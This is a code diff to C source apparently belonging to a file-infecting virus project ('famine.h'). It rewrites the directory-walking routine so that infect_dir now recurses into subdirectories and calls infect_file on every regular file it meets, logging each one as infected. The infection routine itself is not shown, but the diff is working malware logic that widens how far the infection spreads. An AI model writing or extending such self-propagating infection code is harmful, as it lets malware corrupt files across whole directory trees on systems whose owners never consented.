@@ -1,16 +1,24 @@
 #include "../include/famine.h"
 
-static int is_regular(const char *path, const struct linux_dirent64 *ent)
+enum entry_kind { KIND_OTHER, KIND_REG, KIND_DIR };
+
+static enum entry_kind classify(const char *path, const struct linux_dirent64 *ent)
 {
 	struct stat st;
 
 	if (ent->d_type == DT_REG)
-		return (1);
+		return (KIND_REG);
+	if (ent->d_type == DT_DIR)
+		return (KIND_DIR);
 	if (ent->d_type != DT_UNKNOWN)
-		return (0);
+		return (KIND_OTHER);
 	if (lstat(path, &st) < 0)
-		return (0);
-	return (S_ISREG(st.st_mode));
+		return (KIND_OTHER);
+	if (S_ISREG(st.st_mode))
+		return (KIND_REG);
+	if (S_ISDIR(st.st_mode))
+		return (KIND_DIR);
+	return (KIND_OTHER);
 }
 
 // Builds "<dir>/<name>" into buf; returns 0 on success, 1 if it won't fit
@@ -30,7 +38,7 @@ static int join_path(char *buf, size_t size, const char *dir, const char *name)
 	return (0);
 }
 
-void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset)
+void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset, bool recursive)
 {
 	struct my_DIR			d;
 	struct linux_dirent64	*ent;
@@ -44,10 +52,19 @@ void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, siz
 			continue ;
 		if (join_path(path, sizeof(path), dir, ent->d_name))
 			continue ;
-		if (!is_regular(path, ent))
-			continue ;
-		infect_file(path, stub, stub_len, placeholders_offset);
-		LOG("infected file: %s\n", path);
+		switch (classify(path, ent))
+		{
+			case KIND_REG:
+				infect_file(path, stub, stub_len, placeholders_offset);
+				LOG("infected file: %s\n", path);
+				break ;
+			case KIND_DIR:
+				if (recursive)
+					infect_dir(path, stub, stub_len, placeholders_offset, recursive);
+				break ;
+			default:
+				break ;
+		}
 	}
 	closedir(&d);
 	LOG("infected directory: %s\n", dir);
